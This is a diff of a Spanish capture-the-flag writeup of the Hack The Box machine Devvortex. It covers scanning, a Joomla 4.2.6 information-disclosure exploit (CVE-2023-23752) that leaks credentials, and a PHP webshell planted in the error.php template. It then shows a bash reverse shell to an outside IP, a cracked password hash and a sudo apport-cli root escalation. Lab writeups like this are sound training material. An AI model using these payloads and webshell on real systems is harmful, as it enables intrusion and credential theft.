@@ -1,10 +1,29 @@
 ---
 icon: desktop
+layout:
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
 ---
 
 # Devvortex
 
+`Devvortex` es una máquina Linux de dificultad fácil que cuenta con un CMS Joomla que es vulnerable a la divulgación de información. Acceder al archivo de configuración del servicio revela credenciales de texto simple que conducen al acceso administrativo a la instancia de Joomla. Con acceso administrativo, la plantilla de Joomla se modifica para incluir código PHP malicioso y obtener un shell. Después de obtener un shell y enumerar el contenido de la base de datos, se obtienen credenciales en formato hash, que se descifran y conducen al acceso SSH a la máquina. La enumeración posterior a la explotación revela que el usuario tiene permiso para ejecutar apport-cli como root, lo que se aprovecha para obtener un shell root.
 
+<figure><img src="../../.gitbook/assets/Devvortex.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Devvortex**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.242 -oG allPorts
@@ -28,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds
            Raw packets sent: 77282 (3.400MB) | Rcvd: 77296 (3.092MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -41,9 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 28.83 seconds
 [*] Ports copied to clipboard
 ```
 
-
-
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentra expuesta una página web de **Nginx** y el servicio **SSH**.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.242 -A -oN targeted -oX targetedXML
@@ -77,37 +94,40 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 18.07 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
 ❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (320).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos en nuestro archivo `/etc/hosts` la siguiente entrada.
 
 ```bash
-❯ catnp /etc/hosts | grep 10.10.11.242
+❯ cat /etc/hosts | grep 10.10.11.242
 10.10.11.242 devvortex.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una enumeración básica de las tecnologías que utiliza el sitio web a través de la herramienta de `whatweb`.
 
 ```bash
 ❯ whatweb http://devvortex.htb/
 http://devvortex.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@DevVortex.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.242], JQuery[3.4.1], Script[text/javascript], Title[DevVortex], X-UA-Compatible[IE=edge], nginx[1.18.0]
 ```
 
-
+Al acceder a [http://devvortex.htb,](http://devvortex.htb,) verificamos que se trata de una página en la cual a simple vista no logramos ver más páginas ni ningún tipo de información relevante.
 
 <figure><img src="../../.gitbook/assets/imagen (321).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de directorios y páginas, no logramos visualizar algún contenido que nos pueda servir de utilidad.
 
 ```bash
 ❯ dirsearch -u 'http://devvortex.htb' -i 200 -t 50 2>/dev/null
@@ -128,7 +148,9 @@ Target: http://devvortex.htb/
 Task Completed
 ```
 
+### Subdomain Enumeration
 
+Tratando de realizar una enumeración de subdominios de la página web, nos encontramos con el subdominio `dev`.
 
 ```bash
 ❯ wfuzz --hh=154 -c --hc=404,400 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.devvortex.htb" http://devvortex.htb 2>/dev/null
@@ -146,18 +168,18 @@ ID           Response   Lines    Word       Chars       Payload
 000000821:   200        501 L    1581 W     23221 Ch    "dev"  
 ```
 
-
+Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
 ❯ catnp /etc/hosts | grep 10.10.11.242
 10.10.11.242 devvortex.htb dev.devvortex.htb
 ```
 
-
-
-
+Al acceder a [http://dev.devvortex.htb](http://dev.devvortex.htb) nos encontramos con una página similar a la anterior.
 
 <figure><img src="../../.gitbook/assets/imagen (322).png" alt=""><figcaption></figcaption></figure>
+
+Realizando una enumeración de directorios y páginas web del nuevo subdominio, nos encontramos con diferentes directorios y páginas que podremos investigar más adelante.
 
 ```bash
 ❯ dirsearch -u 'http://dev.devvortex.htb' -i 200 -t 50 2>/dev/null
@@ -200,24 +222,42 @@ Target: http://dev.devvortex.htb/
 Task Completed
 ```
 
+## Initial Foothold
 
+### Abusing Joomla to get version with joomla.xml file
+
+Accediendo a [http://dev.devvortex.htb/administrator/](http://dev.devvortex.htb/administrator/) nos encontramos con un panel de inicio de sesión del CMS de **Joomla**.
 
 <figure><img src="../../.gitbook/assets/imagen (323).png" alt=""><figcaption></figcaption></figure>
 
+Podemos hacer uso de la herramienta de `Joomscan` para tratar de verificar la versión de **Joomla** que se encuentra instalada, pero en este caso, decidimos optar por revisarlo manualmente si era posible.
 
+Nos encontramos con el siguiente blog, en el cual nos mencionan cómo podemos intentar verificar la versión de **Joomla** a través de HTTP.
 
 {% embed url="https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http" %}
 
-
+Ralizamos la siguiente petición con`cURL` y visualizamos la versión que está utilizando **Joomla**.
 
 ```bash
 ❯ curl -s -X GET 'http://dev.devvortex.htb/administrator/manifests/files/joomla.xml' | grep '<version>'
 	<version>4.2.6</version>
 ```
 
+### Joomla Exploitation - Sensitive Data Disclosure (CVE-2023-23752)
 
+Revisando posibles vulnerabilidades de esta versión de **Joomla**, nos encontramos con el siguiente `CVE-2023-23752`.
+
+{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2023-23752" %}
+
+{% hint style="danger" %}
+Se descubrió un problema en Joomla! 4.0.0 a 4.2.7. Una comprobación de acceso incorrecta permite el acceso no autorizado a los puntos finales del servicio web.
+{% endhint %}
+
+Buscando más información por Internet, nos encontramos con el siguiente blog en el cual nos menciona la vulnerabilidad y diferentes opciones para probar de intentar aprovecharnos.
 
 {% embed url="https://vulncheck.com/blog/joomla-for-rce" %}
+
+En este caso, a través de la siguiente petición con `cURL`, nos encontramos con unas credenciales en texto plano expuestas en el EndPoint.
 
 ```bash
 ❯ curl -s 'http://dev.devvortex.htb/api/index.php/v1/config/application?public=true' | jq
@@ -247,7 +287,7 @@ Task Completed
     }
 ```
 
-
+Realizando la siguiente consulta, verificamos los usuarios que que se encuentran públicos. Logramos verificar que existe un usuario administrador `lewis` y un usuario registrado llamado `logan`.
 
 ```bash
 ❯ curl -s -X GET 'http://dev.devvortex.htb/api/index.php/v1/users?public=true' | jq
@@ -300,63 +340,72 @@ Task Completed
 
 ```
 
-
-
-
+Probaremos de verificar si podemos acceder al panel de Administración de **Joomla** a través de las credenciales obtenidas y de los usuarios que disponemos.
 
 <figure><img src="../../.gitbook/assets/imagen (324).png" alt=""><figcaption></figcaption></figure>
 
+### Customizing administration templante to achive RCE
 
+Verificaremos que hemos logrado acceder con el usuario Administrador de **Joomla** `lewis`.
+
+Dado que somos los administradores de **Joomla**, podemos intentar verificar diferentes campos para tratar de obtener acceso al sistema.
+
+Lo primero que se nos ocurrió, fue en intentar modificar alguna plantilla de la web para inyectar algún comando y lograr obtener un **RCE**. Para ello, deberemos de ingresar a (System < Templates)
 
 <figure><img src="../../.gitbook/assets/imagen (325).png" alt=""><figcaption></figcaption></figure>
 
-
+Al acceder a las plantillas que dispone el sitio web, tratamos de modificar la plantilla del archivo `index.php` indicándole que nos muestre un nuevo `meta tag` para verificar en el código fuente que se haya modificado correctamente. En este caso, al intentar guardar los cambios, se nos indicaba que no disponíamos de los permisos necesarios para escribir en el archivo.
 
 <figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Por lo que decidimos probar en el archivo `error.php`, con lo cual verificamos que este archivo se trataba de una página en PHP, añadimos una nueva cadena para que nos imprima el valor `gzzcoo`. Al intentar guardar la plantilla modificada, verificamos que en este caso si nos permitió guardarla.
 
 <figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al tratar de acceder a una ruta que no existe, por ejemplo http://dev.devvortex.htb/gzzcoo, verificamos que se nos muestra la plantilla de `error.php` y se nos visualiza el comando que hemos inyectado en la plantilla.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Volvimos de nuevo para editar el archivo `error.php`, para que esta vez a través de la función `system` de PHP intente ejecutar el comando `whoami`.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al tratar de acceder de nuevo a una página inexistente para que nos cargue el `error.php`, verificamos que se ha logrado ejecutar el comando `whoami` sin problemas, por lo tanto, parece ser que hemos logrado obtener una potencial vía para lograr un **RCE** y ejeuctar comandos  arbitrarios en el servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>
 
+Editamos nuevamente la plantilla de `error.php` para que nos incluya la siguiente función que lo que realizará es una **webshell** para lograr ejecutar comandos a través del parámetro `gzzcoo` para así no tener que ir editando cada vez la plantilla.
 
+```php
+if (isset($_REQUEST['gzzcoo'])) {
+  system($_REQUEST['gzzcoo']);
+  die();
+}
+```
 
 <figure><img src="../../.gitbook/assets/imagen (6).png" alt=""><figcaption></figcaption></figure>
 
-
+Revisaremos desde consola, a través de la herramienta `cURL` de si la webshell creada funciona correctamente. En este caso, haremos una petición a una página inexistente para que nos salte la plantilla de `error.php` e indicaremos el parámetro configurado y el comando a ejecutar. Logramos tener una **webshell** a través de una plantilla modificada de **Joomla**.
 
 ```bash
 ❯ curl -s 'http://dev.devvortex.htb/gzzcoo' --data-urlencode 'gzzcoo=whoami'
 www-data
 ```
 
-
-
-
+El siguiente paso será lograr obtener acceso remoto al sistema. Por lo tanto, nos pondremos en escucha con **nc**.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos la Reverse Shell a través de la **webshell** que disponemos.
 
 ```bash
 ❯ curl -s 'http://dev.devvortex.htb/gzzcoo' --data-urlencode 'gzzcoo=/bin/bash -c "bash -i >& /dev/tcp/10.10.16.2/443 0>&1"'
 ```
 
-
+Verificamos que logramos acceder al sistema y nos encontramos como usuario `www-data`.
 
 ```bash
 ❯ nc -nlvp 443
@@ -367,7 +416,11 @@ bash: no job control in this shell
 www-data@devvortex:~/dev.devvortex.htb$
 ```
 
+## Initial Access
 
+### Database Enumeration
+
+Dado que disponemos de un usuario con privilegios limitados, visualizaremos posibles usuarios en los cuáles nos interesaría pivotar. En este caso, verificamos que los únicos usuarios que disponen de una `bash` son los usuarios `root` y `logan`.
 
 ```bash
 www-data@devvortex:~/dev.devvortex.htb$ cat /etc/passwd | grep bash
@@ -375,7 +428,7 @@ root:x:0:0:root:/root:/bin/bash
 logan:x:1000:1000:,,,:/home/logan:/bin/bash
 ```
 
-
+Revisando los archivos que disponemos en el dierctorio actual, verificamos que hay uno que nos llama bastante la atención, el archivo que miraremos su contenid es el de `configuration.php`.
 
 ```bash
 www-data@devvortex:~/dev.devvortex.htb$ ls -l
@@ -404,7 +457,7 @@ drwxr-xr-x  2 www-data www-data  4096 Feb  5 23:04 tmp
 -rwxr-xr-x  1 www-data www-data  2974 Dec 13  2022 web.config.txt
 ```
 
-
+Al visualizar el contenido de este archivo, logramos obtener las credenciales en texto plano del acceso al MySQL.
 
 ```bash
 www-data@devvortex:~/dev.devvortex.htb$ cat configuration.php 
@@ -428,11 +481,14 @@ class JConfig {
 	public $password = 'P4ntherg0t1n5r3c0n##';// Some code
 ```
 
+Verificaremos que disponemos de `MySQL` instalado en el equipo, al comprobar esto, nos conectaremos con las credenciales obtenidas.
 
+Al acceder al MySQL, visualizamos las bases de datos existentes, trataremos de investigar la tabla `joomla`.
 
 ```bash
 www-data@devvortex:~/dev.devvortex.htb$ which mysql
 /usr/bin/mysql
+
 www-data@devvortex:~/dev.devvortex.htb$ mysql -u lewis -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -465,7 +521,7 @@ Database changed
 mysql> 
 ```
 
-
+Al visualizar las tablas que disponía esta BBDD, nos llama la atención la tabla nombrada como `sd4fg_users`.
 
 <pre class="language-bash"><code class="lang-bash">mysql> SHOW TABLES;
 +-------------------------------+
@@ -495,7 +551,7 @@ mysql>
 71 rows in set (0.00 sec)
 </code></pre>
 
-
+Al revisar los valores de esta tabla, logramos obtener el hash de la contraseña del usuario `logan` el cual no disponíamos de acceso a él y si bien recordamos, disponía de `bash` para acceder al sistema.
 
 ```bash
 mysql> SELECT * FROM sd4fg_users;
@@ -508,7 +564,7 @@ mysql> SELECT * FROM sd4fg_users;
 2 rows in set (0.00 sec)
 ```
 
-
+Verificamos que el hash se trata de un hash tipo `Blowfish`, intentamos crackear este hash a través de `hashcat` y verificamos que logramos obtener la contraseña en texto plano.
 
 ```bash
 ❯ hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
@@ -528,7 +584,7 @@ OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8,
 $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
 ```
 
-
+Intentaremos acceder con estas nuevas credenciales mediante SSH, logramos el acceso y visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh logan@devvortex.htb
@@ -548,7 +604,11 @@ logan@devvortex:~$ cat user.txt
 272c6688bdf7********************
 ```
 
+## Privilege Escalation
 
+### Abusing sudoers privilege (apport-cli)
+
+Al revisar si el usuario actual `logan` disponía de algún permiso de `sudoers`, nos encontramos que puede ejecutar como usuario `sudo` el binario `/usr/bin/apport-cli`
 
 ```bash
 logan@devvortex:~$ sudo -l
@@ -560,9 +620,13 @@ User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
 ```
 
-
+Revisando por Internet posibles maneras de escalar nuestros privilegios a través de este privilegio sobre el binario, nos encontramos con el siguiente PoC.
 
 {% embed url="https://github.com/diego-tella/CVE-2023-1326-PoC" %}
+
+La idea principal de esta escalada de privilegios, es realizar un reporte random y en el último paso cuando se genere el reporte, ingresar la opción `V` para acceder a un modo de visualización (similar al comando less) y salir de este modo a través de `!bash` y convertirnos en usuario `root`.
+
+Verificamos que logramos disponer de una bash de `root` y visualizar la flag de **root.txt**.
 
 ```bash
 logan@devvortex:~$ sudo /usr/bin/apport-cli --file-bug
